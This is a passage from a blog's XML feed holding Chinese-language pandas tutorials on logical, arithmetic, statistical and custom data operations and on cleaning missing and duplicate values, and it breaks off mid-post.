python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df[[<span class="string">'1-学号'</span>,<span class="string">'2-姓名'</span>,<span class="string">'3-年龄'</span>]].rename(columns=&#123;<span class="string">'1-学号'</span>:<span class="string">'ID'</span>,<span class="string">'2-姓名'</span>:<span class="string">'name'</span>,<span class="string">'3-年龄'</span>:<span class="string">'age'</span>&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220204/%E9%87%8D%E5%91%BD%E5%90%8D%E5%A4%9A%E5%88%97.png" alt="多个列重命名"></p><p>如果需要重命名行索引，可以通过df.rename(index={‘原索引’:’重命名索引’})的方式进行重命名。</p><p>至此，本文通过几个实例介绍了pandas常用的数据转换工具映射map()、替换replace()、重命名rename()</p><p>数据集及源代码见：<a href="https://github.com/xiejava1018/pandastest.git" target="_blank" rel="noopener">https://github.com/xiejava1018/pandastest.git</a></p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandas数据分析之数据运算(逻辑运算、算术运算、统计运算、自定义运算)</title>
      <link href="/posts/f44191db/"/>
      <url>/posts/f44191db/</url>
      
        <content type="html"><![CDATA[<p>数据分析离不开数据运算，在介绍完pandas的数据加载、排序和排名、数据清洗之后，本文通过实例来介绍pandas的常用数据运算，包括逻辑运算、算术运算、统计运算及自定义运算。</p><h1 id="一、逻辑运算"><a href="#一、逻辑运算" class="headerlink" title="一、逻辑运算"></a>一、逻辑运算</h1><p>逻辑运算是程序代码中经常用到的一种运算。pandas的逻辑运算与Python基础语法中的逻辑运算存在一些差异。pandas的逻辑运算主要用于条件过滤根据条件逻辑运算得出的结果过滤检索出相应的数据。<br>我们来看一些例子：<br>数据集为学生数据集</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">df = pd.read_excel(<span class="string">'D:\\Python\\study\\pythontest\\pandastest\\数据集\\student.xlsx'</span>)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/student%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="学生数据集"><br>我们要过滤检索出语文成绩大于95分的数据，通过<code>df[&#39;4-语文&#39;]&gt;95</code>的条件语句，可以得到一个结果为bool值的Series，True表示满足语文成绩&gt;95分的，False表示不满足语文成绩&gt;95的。<br>在pandas中，将Series与数值进行比较，会得到一个与自身形状相同且全为布尔值的Series，每个位置的布尔值对应该位置的比较结果。<br>这种进行比较的代码，返回值是布尔值，是一种布尔表达式，也可以被称为逻辑语句，只要代码返回的结果是布尔值，都可以把代码当成逻辑语句。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/%E8%AF%AD%E6%96%87%E5%A4%A7%E4%BA%8E95%E7%9A%84%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97.png" alt="语文大于95的逻辑运算"><br>根据逻辑语句的布尔值，可以用来对数据进行筛选，按我们的需要从大量数据中过滤出目标数据。如我们要过滤出语文成绩大于95的数据，就可以用上述逻辑语句的布尔值进行筛选。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df[df[<span class="string">'4-语文'</span>]&gt;<span class="number">95</span>]</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/%E8%AF%AD%E6%96%87%E5%A4%A7%E4%BA%8E95%E7%9A%84%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%BB%93%E6%9E%9C.png" alt="语文大于95的结果"></p><p>除了直接的比较，pandas中有很多函数都会返回布尔值，如all()，any()，isna()等对整个DataFrame或Series的判断结果，eq()，ne()，lt()，gt()等比较函数的结果，都是布尔值。<br>逻辑语句是为逻辑运算服务的，可以直接作为判断条件。在复杂的逻辑关系中，需要使用复合逻辑运算，用逻辑运算符来连接多个逻辑语句，复合逻辑运算包含：逻辑与&amp;、逻辑或|、逻辑非~。</p><h2 id="逻辑与-amp"><a href="#逻辑与-amp" class="headerlink" title="逻辑与&amp;"></a>逻辑与&amp;</h2><p>pandas中用符号 &amp; 表示逻辑与，连接两个逻辑语句，同时为真才为真。在Python基本语法中，使用 and 表示逻辑与，但是Pandas中只能用 &amp; ，不能用and，会报模糊错误。<br>如我们要检索出一班并且语文成绩大于95的数据。可以用 <code>df[(df[&#39;4-语文&#39;]&gt;95) &amp; (df[&#39;班级&#39;]==&#39;一班&#39;)]</code><br>注意两个条件逻辑语句要分别用()括起来然后再用逻辑运算符进行运算。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/%E8%AF%AD%E6%96%87%E5%A4%A7%E4%BA%8E95%E4%B8%94%E4%B8%BA%E4%B8%80%E7%8F%AD%E7%9A%84%E6%95%B0%E6%8D%AE.png" alt="逻辑与&amp;"></p><h2 id="逻辑或"><a href="#逻辑或" class="headerlink" title="逻辑或|"></a>逻辑或|</h2><p>pandas中用符号 | 表示逻辑或，连接两个逻辑语句，只要其中一个为真就为真。<br>在Python基本语法中，使用 or 表示逻辑或，但是Pandas中只能用 | ，不能用or。<br>如我们要检索出语文成绩大于95或英语成绩大于96的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df[(df[<span class="string">'4-语文'</span>]&gt;<span class="number">95</span>)|(df[<span class="string">'6-英语'</span>]&gt;<span class="number">96</span>)]</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/%E8%AF%AD%E6%96%87%E5%A4%A7%E4%BA%8E95%E6%88%96%E8%8B%B1%E8%AF%AD%E5%A4%A7%E4%BA%8E96%E7%9A%84%E6%95%B0%E6%8D%AE.png" alt="逻辑或|"></p><h2 id="逻辑非"><a href="#逻辑非" class="headerlink" title="逻辑非~"></a>逻辑非~</h2><p>pandas中用符号 ~ 表示逻辑非，对逻辑语句取反。<br>在Python基本语法中，使用 not 表示逻辑非，但是Pandas中只能用 ~ ，不能用not。<br>如我们要检索出数据成绩&gt;98并且不是一班的同学</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df[(df[<span class="string">'5-数学'</span>]&gt;<span class="number">98</span>) &amp; ~(df[<span class="string">'班级'</span>]==<span class="string">'一班'</span>)]</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/%E9%80%BB%E8%BE%91%E9%9D%9E%E8%BF%90%E7%AE%97.png" alt="逻辑非~"></p><p>当然也可以用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df[(df[<span class="string">'5-数学'</span>]&gt;<span class="number">98</span>) &amp; (df[<span class="string">'班级'</span>]!=<span class="string">'一班'</span>)]</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/%E9%80%BB%E8%BE%91%E4%B8%8D%E7%AD%89%E4%BA%8E%E8%BF%90%E7%AE%97.png" alt="逻辑不等于"></p><h1 id="二、算术运算"><a href="#二、算术运算" class="headerlink" title="二、算术运算"></a>二、算术运算</h1><p>pandas最重要的一个功能是，它可以对不同索引的对象进行算术运算也就是（+、-、*、\）。<br>常见的算术云算是加法+运算，如果相加的对象是标量，则数据对象通过广播机制，每个数据值都+标量。如果相加的对象是数据对象则按索引进行算术运算。<br>通过一个数据集来看一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">data1=pd.DataFrame(np.arange(<span class="number">16</span>).reshape((<span class="number">4</span>,<span class="number">4</span>)),columns=[<span class="string">'列1'</span>,<span class="string">'列2'</span>,<span class="string">'列3'</span>,<span class="string">'列4'</span>])</span><br><span class="line">data1</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="数据运算数据集"></p><h2 id="1、使用算术运算符"><a href="#1、使用算术运算符" class="headerlink" title="1、使用算术运算符"></a>1、使用算术运算符</h2><p>和标量计算，标量运算会在算术运算过程中传播。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data2=data1+<span class="number">1</span></span><br><span class="line">data2</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/+%E8%BF%90%E7%AE%97.png" alt="加标量"><br>可以看到数据集中每个值都+1了<br>和索引相同的数据对象运算，对每个数据值进行算术运算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data3=pd.DataFrame(np.arange(<span class="number">16</span>).reshape((<span class="number">4</span>,<span class="number">4</span>)),columns=[<span class="string">'列1'</span>,<span class="string">'列2'</span>,<span class="string">'列3'</span>,<span class="string">'列4'</span>])</span><br><span class="line">data4=data2+data3</span><br><span class="line">data4</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/dataframe%E7%9B%B8%E5%8A%A0.png" alt="DataFrame相加"></p><p>在将对象相加时，如果存在不同的索引就是该索引对的并集。自动的数据对齐操作在不重叠的索引引入NA值。缺失值会在算术运算过程中传播。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data5=pd.DataFrame(np.ones([<span class="number">3</span>,<span class="number">3</span>]),columns=[<span class="string">'列1'</span>,<span class="string">'列2'</span>,<span class="string">'列3'</span>])</span><br><span class="line">data5</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/%E5%85%A8%E4%B8%BA1%E7%9A%84%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="全为1的数据集"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data6=data4+data5</span><br><span class="line">data6</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/%E5%BD%A2%E7%8A%B6%E4%B8%8D%E7%9B%B8%E5%90%8C%E7%9A%84%E4%B8%A4%E4%B8%AAdataframe%E7%9B%B8%E5%8A%A0.png" alt="形状不同的数据集相加"></p><h2 id="2、使用算数运算函数"><a href="#2、使用算数运算函数" class="headerlink" title="2、使用算数运算函数"></a>2、使用算数运算函数</h2><p>算数运算函数包括add、sub、div、mul等对应于算术运算符如下：</p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>add,radd</td><td>用于加法（+）的方法</td></tr><tr><td>sub,rsub</td><td>用于减法（- ）的方法</td></tr><tr><td>div,rdiv</td><td>用于除法（/）的方法</td></tr><tr><td>floordiv,rfloordiv</td><td>用于底除（//）的方法</td></tr><tr><td>mul,rmul</td><td>用于乘法（* ）的方法</td></tr><tr><td>pow,rpow</td><td>用于指数（**）的方法</td></tr></tbody></table><h3 id="加法："><a href="#加法：" class="headerlink" title="加法："></a>加法：</h3><p>在对不同索引的对象进行算术运算时，如果希望当一个对象中某个轴标签在另一个对象中找不到时填充一个特殊值比如0，可以通过算术方法进行填充，然后再相加。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/add%E5%87%BD%E6%95%B0.png" alt="加法函数"><br>上面的例子展示了，因为data5的行索引为3和列索引为列4用0填充后再相加所以行索引为3和列索引为列4的值是data4的值+0</p><h3 id="减法："><a href="#减法：" class="headerlink" title="减法："></a>减法：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data4.sub(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/sub%E5%87%BD%E6%95%B0.png" alt="sub函数"></p><h3 id="乘法："><a href="#乘法：" class="headerlink" title="乘法："></a>乘法：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data4.mul(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/mul%E5%87%BD%E6%95%B0.png" alt="mul函数"></p><h3 id="除法："><a href="#除法：" class="headerlink" title="除法："></a>除法：</h3><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/div%E5%87%BD%E6%95%B0.png" alt="div函数"></p><h1 id="三、统计运算"><a href="#三、统计运算" class="headerlink" title="三、统计运算"></a>三、统计运算</h1><p>统计运算就是我们常用的数据集的求和、算平均值、最大值、最小值、绝对值、标准差等统计数据。在pandas中提供了丰富的统计函数可以方便的进行统计运算。</p><h2 id="1、describe汇总描述统计"><a href="#1、describe汇总描述统计" class="headerlink" title="1、describe汇总描述统计"></a>1、describe汇总描述统计</h2><p>通过np.random.randn(1000,4)生成1000个正态分布的随机数据集看一下describe的汇总描叙统计。<br>包含了数据个数count、均值mean、标准差std、最小值min、最大值等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1000个正态分布的随机数统计信息</span></span><br><span class="line">data=pd.DataFrame(np.random.randn(<span class="number">1000</span>,<span class="number">4</span>))</span><br><span class="line">data.describe()</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/%E7%BB%9F%E8%AE%A1%E8%AE%A1%E7%AE%97%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="describe汇总描述统计"></p><h2 id="2、统计函数"><a href="#2、统计函数" class="headerlink" title="2、统计函数"></a>2、统计函数</h2><p>pandas常用统计函数如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/%E7%BB%9F%E8%AE%A1%E5%87%BD%E6%95%B0.png" alt="常用统计函数"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.max()</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/max%E5%87%BD%E6%95%B0.png" alt="max函数"></p><p>可以算出DataFrame中每一列的最大值</p><p>如果只需要计算某一列的最大值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data[<span class="number">1</span>].max()</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/%E7%BB%9F%E8%AE%A1%E4%B8%80%E5%88%97%E7%9A%84max.png" alt="计算某一列的最大值"></p><p>对单个函数进行统计的时候，坐标轴还是按照这些默认为columns(axis=0, default)，如果要对index进行统计，则要指明(axis=1) 这里的axis取值与axis=0对应index，axis=1对应columns不同</p><ul><li>使用0值表示沿着每一列或行标签\索引值向下执行方法</li><li>使用1值表示沿着每一行或者列标签模向执行对应的方法<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/%E6%AF%8F%E4%B8%80%E8%A1%8C%E7%9A%84max.png" alt="axis=1"></li></ul><p>如果要计算某一行的最大值<br>用<code>data.loc[0].max()</code>，通过loc[]检索出需要统计的行，再用统计函数进行统计<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/%E7%BB%9F%E8%AE%A1%E6%9F%90%E4%B8%80%E8%A1%8C%E7%9A%84max.png" alt="计算某一行的最大值"><br>累计统计cumsum,计算前n个数的和<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/%E7%BB%9F%E8%AE%A1%E7%B4%AF%E8%AE%A1%E5%92%8C.png" alt="计算前n个数的和"></p><h1 id="四、自定义运算"><a href="#四、自定义运算" class="headerlink" title="四、自定义运算"></a>四、自定义运算</h1><p>如果常用的统计运算还不能满足，pandas提供了方法可以进行自定义运算。</p><p> apply(func, axis=0)</p><ul><li>func – 自定义函数 axis=0 – 默认是列（按行标签方向执行方法）</li><li>axis=1为对行进行运算（按列标签方向执行方法）</li></ul><p>如：自定义一个对列求max-min的函数<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/head.png" alt="head()"><br>通过lambda匿名函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.apply(<span class="keyword">lambda</span> x: x.max() - x.min()) <span class="comment"># lambda为匿名函数，x为自变量，冒号后面为函数表达式</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/lambda%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%9F%E8%AE%A1%E5%87%BD%E6%95%B0.png" alt="lambda匿名函数"></p><p>通过自定义函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#自定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maxdivmin</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x.max()-x.min()</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220203/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0.png" alt="自定义函数"><br>至此，本文通过实例简单介绍了pandas数据分析的数据运算包括逻辑运算、算术运算、统计运算、自定义运算，也是平时在实际应用中常用的运算。</p><p>数据集及源代码见：<a href="https://github.com/xiejava1018/pandastest.git" target="_blank" rel="noopener">https://github.com/xiejava1018/pandastest.git</a></p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandas数据清洗之处理缺失、重复、异常数据</title>
      <link href="/posts/a87a78e2/"/>
      <url>/posts/a87a78e2/</url>
      
        <content type="html"><![CDATA[<p>在数据分析和建模的过程中，有相当多的时间要用在数据准备上：加载、清理、转换以及重塑。这些工作会占到分析师时间的80%或更多。幸运的是pandas和内置的Python标准库提供了高效、灵活的工具可以帮助我们轻松的做这些事情。</p><p>本文重点介绍通过pandas进行数据的清洗。数据处理中的清洗工作主要包括对需要分析的数据集中的缺失值（空值）、重复值、异常值的处理。对于数据清洗一般也是分两个步骤，第一步就是要很方便快速的找到需要处理的数据，如何快速找到数据中的缺失值（空值）、重复数据或异常的数据，第二步是对找到的数据根据自己的实际使用需求进行处理，如删除还是替换成其他的数据。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220201/pandas%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97.png" alt="pandas数据清洗"></p><h1 id="一、处理缺失值"><a href="#一、处理缺失值" class="headerlink" title="一、处理缺失值"></a>一、处理缺失值</h1><p>在许多数据分析工作过程中，由于对数据质量问题，缺失数据是经常发生的。对于数值数据，pandas使用浮点值NaN(Not a Number)表示缺失数据。在pandas中，还采用了R语言中惯用的缺失值表示法NA，它表示不可用not available。在统计应用中，NA数据可能是不存在的数据或虽然存在但是看不到。进行数据清洗对缺失数据进行分析，以判断数据采集的问题或缺失数据导致的偏差。</p><h2 id="1、判断缺失值（空值）"><a href="#1、判断缺失值（空值）" class="headerlink" title="1、判断缺失值（空值）"></a>1、判断缺失值（空值）</h2><p>在pandas中通过isna()或isnull()方法判断空值，二者等价，用于判断一个series或dataframe各元素值是否为空的bool结果。需注意对空值的界定：即None或numpy.nan才算空值，而空字符串、空列表等则不属于空值；类似地，notna()和notnull()则用于判断是否非空。<br>看下实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">stud_data=pd.Series([<span class="string">'张三'</span>,<span class="string">'李四'</span>,np.nan,[],<span class="string">''</span>,<span class="literal">None</span>,<span class="string">'王五'</span>])</span><br><span class="line">stud_data</span><br></pre></td></tr></table></figure><p>通过stud_data.isnull()和stud_data.isna()分别来判断空值<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220201/pandas%E7%A9%BA%E5%80%BC%E5%88%A4%E6%96%AD.png" alt="判断空值"></p><p>类似地，notna()和notnull()则用于判断是否非空<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220201/pandas%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%B8%BA%E9%9D%9E%E7%A9%BA.png" alt="判断是否非空"><br>同样的对于DataFrame中的缺失数据判断也是一样的。<br>构建DataFrame</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stud_df=pd.DataFrame(stud_data,columns=[<span class="string">'student_name'</span>])</span><br><span class="line">stud_df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220201/pandasDataFrame%E9%9D%9E%E7%A9%BA%E5%88%A4%E6%96%AD.png" alt="DataFrame中的缺失数据判断"></p><p>对于缺失值的处理有两种常用的方式，一是用按一定的策略对空值进行填充，二是对于缺失值干脆进行删除。</p><h2 id="2、填充缺失值（空值）"><a href="#2、填充缺失值（空值）" class="headerlink" title="2、填充缺失值（空值）"></a>2、填充缺失值（空值）</h2><p>pandas中用户填充缺失值的方法是fillna()，可以按一定的策略对空值进行填充，如常数填充、向前/向后填充等，也可通过inplace参数确定是否本地更改。</p><h3 id="1-常量填充"><a href="#1-常量填充" class="headerlink" title="1.常量填充"></a>1.常量填充</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stud_df[[<span class="string">'student_name'</span>]].fillna(<span class="string">'某某'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220201/pandas%E5%A1%AB%E5%85%85%E9%9D%9E%E7%A9%BA.png" alt="常量填充"></p><p>可以看到判断为缺失值的地方都填充了”某某”，因为空字符串和空列表都不是缺失值，所以没有填充。</p><h3 id="2-向前和向后填充NA"><a href="#2-向前和向后填充NA" class="headerlink" title="2.向前和向后填充NA"></a>2.向前和向后填充NA</h3><p>通过fillna(mathod=’ffill’)，mathod=’ffill’ 向前填充和 mathod=’bfill’ 向后填充，也就是说用前面的值来填充NA或用后面的值来填充NA<br>我们来增加一列性别列gender来看一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stud_gender_data=pd.Series([<span class="number">1</span>,<span class="number">0</span>,np.nan,<span class="string">'女'</span>,<span class="number">1</span>,<span class="literal">None</span>,<span class="string">'男'</span>])</span><br><span class="line">stud_df[<span class="string">'gender'</span>]=stud_gender_data</span><br><span class="line">stud_df</span><br><span class="line">stud_df[[<span class="string">'gender'</span>]].fillna(method=<span class="string">'ffill'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220201/pandas%E5%A1%AB%E5%85%85%E9%9D%9E%E7%A9%BAffill.png" alt="向前和向后填充NA"></p><p>可以看到通过method=’ffill’，将NaN和None前面的值填充端到了NaN和None。<br>用fillna()进行填充会返回一个填充好的数据集的副本，并没有对原始数据进行操作，如果要修改原始数据可以通过inplace参数确定是否本地更改。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220201/pandas%E5%A1%AB%E5%85%85%E9%9D%9E%E7%A9%BAffill-inplace=True.png" alt="通过inplace参数确定是否本地更改"></p><h2 id="3、删除缺失值（空值）"><a href="#3、删除缺失值（空值）" class="headerlink" title="3、删除缺失值（空值）"></a>3、删除缺失值（空值）</h2><p>如果想删除缺失值，那么使用 dropna() 函数与参数 axis 可以实现。在默认情况下，按照 axis=0 来按行处理，这意味着如果某一行中存在 NaN 值将会删除整行数据。如果在dropna()中传入<code>how=&#39;all&#39;</code>将只会删除全为NA或NaN的行。示例如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220201/pandas%E5%88%A0%E9%99%A4%E7%A9%BA%E5%80%BC.png" alt="删除缺失值（空值）"></p><h1 id="二、处理重复值"><a href="#二、处理重复值" class="headerlink" title="二、处理重复值"></a>二、处理重复值</h1><p>重复数据也是在实际数据处理过程中碰到比较多的，处理重复数据就是在数据集中找出重复数据然后将其删除保留一个唯一不重复的数据。</p><h2 id="1、检测重复值"><a href="#1、检测重复值" class="headerlink" title="1、检测重复值"></a>1、检测重复值</h2><p>pandas通过duplicated()方法检测各行是否重复，返回一个行索引的bool结果，可通过keep参数设置保留第一行、最后一行、无保留，例如keep=first意味着在存在重复的多行时，首行被认为是合法的而可以保留。<br>构造一个DataFrame来看一个实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data=pd.DataFrame(&#123;<span class="string">'key1'</span>:[<span class="string">'A'</span>,<span class="string">'B'</span>]*<span class="number">3</span>+[<span class="string">'B'</span>],<span class="string">'key2'</span>:[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>]&#125;)</span><br><span class="line">data</span><br><span class="line">data.duplicated()</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220201/pandas%E6%A3%80%E6%B5%8B%E9%87%8D%E5%A4%8D%E9%A1%B9.png" alt="检测重复值"></p><h2 id="2、删除重复值"><a href="#2、删除重复值" class="headerlink" title="2、删除重复值"></a>2、删除重复值</h2><p>pandas通过drop_duplicates()方法按行检测并删除重复的记录，也可通过keep参数设置保留项。由于该方法默认是按行进行检测，如果存在某个需要需要按列删除，则可以先转置再执行该方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.drop_duplicates()</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220201/pandas%E5%88%A0%E9%99%A4%E9%87%8D%E5%A4%8D%E9%A1%B9.png" alt="删除重复值"><br>可以看到第7行也就是index为6的重复行被删除了。<br>当带了<code>keep=&#39;last&#39;</code>参数时，保留最后一个重复项，前面的重复项将被丢弃。可以看到保留的是索引为6的，索引为5的重复项被丢弃了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220201/pandas%E5%88%A0%E9%99%A4%E9%87%8D%E5%A4%8D%E9%A1%B9-keeplast.png" alt="保留最后一个重复项"></p><h1 id="三、处理异常值"><a href="#三、处理异常值" class="headerlink" title="三、处理异常值"></a>三、处理异常值</h1><h2 id="1、判断异常值"><a href="#1、判断异常值" class="headerlink" title="1、判断异常值"></a>1、判断异常值</h2><p>判断异常值的标准依赖具体分析数据，如大于或小于某个基线范围的值。<br>我们来看一个含有正态分布的DataFrame数据集</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data=pd.DataFrame(np.random.randn(<span class="number">1000</span>,<span class="number">4</span>))</span><br><span class="line">data.describe()</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220201/pandas%E6%AD%A3%E6%80%81%E5%88%86%E5%B8%83%E6%95%B0%E6%8D%AE%E9%9B%86.png" 